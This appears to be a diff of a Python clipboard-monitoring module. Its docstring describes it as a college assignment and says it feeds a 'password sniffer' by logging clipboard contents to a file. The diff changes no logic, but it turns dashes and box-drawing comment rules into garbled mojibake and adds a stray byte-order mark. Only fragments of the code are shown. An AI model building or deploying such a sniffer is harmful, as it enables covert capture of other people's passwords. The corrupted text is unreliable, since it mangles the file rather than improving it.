@@ -1,11 +1,11 @@
-"""
-clipboard_monitor.py — Background clipboard watcher.
+﻿"""
+clipboard_monitor.py â€” Background clipboard watcher.
 
 Polls the system clipboard every 300 ms.  When content changes, logs it to
 clipboard_log.txt and invokes an optional callback so the password sniffer
 can correlate clipboard pastes with Enter-key submissions.
 
-College cybersecurity assignment — run only on systems you own.
+College cybersecurity assignment â€” run only on systems you own.
 """
 
 import threading
@@ -35,7 +35,7 @@ class ClipboardMonitor(threading.Thread):
         self._callback     = callback   # callable(event_type: str, content: str)
         self._log          = config.CLIPBOARD_FILE
 
-    # ── Thread entry ──────────────────────────────────────────────────────────
+    # â”€â”€ Thread entry â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
     def run(self) -> None:
         if not _PYPERCLIP:
@@ -63,13 +63,13 @@ class ClipboardMonitor(threading.Thread):
     def stop(self) -> None:
         self._running = False
 
-    # ── Properties ────────────────────────────────────────────────────────────
+    # â”€â”€ Properties â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
     @property
     def last_content(self) -> str:
         return self._last
 
-    # ── Internal ──────────────────────────────────────────────────────────────
+    # â”€â”€ Internal â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
     def _on_change(self, content: str) -> None:
         ts      = _ts()
@@ -94,3 +94,4 @@ class ClipboardMonitor(threading.Thread):
                 f.write(f"\n--- Clipboard Monitor started: {_ts()} ---\n")
         except OSError:
             pass
+
